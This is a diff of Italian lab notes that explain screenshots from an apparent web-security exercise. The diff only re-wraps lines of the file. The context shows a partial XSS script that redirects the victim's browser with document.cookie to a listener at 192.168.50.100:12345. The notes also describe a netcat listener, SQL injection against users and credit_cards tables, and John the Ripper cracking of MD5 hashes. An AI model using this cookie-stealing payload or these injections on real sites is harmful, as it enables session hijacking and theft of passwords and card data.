@@ -4,8 +4,10 @@ Screenshot 1:  Lo script <script>window.location="http://192.168.50.100:12345/?c
                aggiungendo i cookie dell'utente (document.cookie) alla fine dell'URL come parametro.
 Screenshot 2:  Il server rimane in ascolto sulla porta 12345. Quando un client si connetterà a questa porta, netcat mostrerà i dati inviati dal client sullo stdout
 Screenshot 3:  La stringa è un'attacco di SQL injection per recuperare le informazioni sugli utenti e le password dalla tabella users di un database.
-Screenshot 4:  Il comando esguito è una chiamata al programma John the Ripper, un popolare strumento di cracking delle password. Questo comando viene utilizzato per eseguire un attacco di forza bruta o di dizionario per cercare di recuperare le password da un file hash MD5.
-Screenshot 5:  Questa stringa è simile allo screenshot 3, dove l'obiettivo è quello di ottenere informazioni sensibili come il numero della carta di credito (ccnumber) e il codice di verifica della carta di credito (ccv) dalla tabella credit_cards.
+Screenshot 4:  Il comando esguito è una chiamata al programma John the Ripper, un popolare strumento di cracking delle password. Questo comando viene utilizzato per eseguire un attacco di forza bruta o di dizionario per cercare di 
+               recuperare le password da un file hash MD5.
+Screenshot 5:  Questa stringa è simile allo screenshot 3, dove l'obiettivo è quello di ottenere informazioni sensibili come il numero della carta di credito (ccnumber) e il codice di verifica della carta di credito (ccv) dalla 
+               tabella credit_cards.
 Screenshot 6:  Questa stringa è un tentativo di attacco di SQL injection, simile allo Screenshot 3 e 5. L'obiettivo sembra essere quello di recuperare informazioni sensibili come i numeri 
                delle carte di credito (ccnumber) e le date di scadenza delle carte di credito (expiration) dalla tabella credit_cards di un database, presumibilmente all'interno di un'applicazione vulnerabile.
 Screenshot 7:  Questa stringa esegue un'attacco di SQL injection per ottenere informazioni sulle colonne della tabella credit_cards da uno schema di informazioni (information_schema).
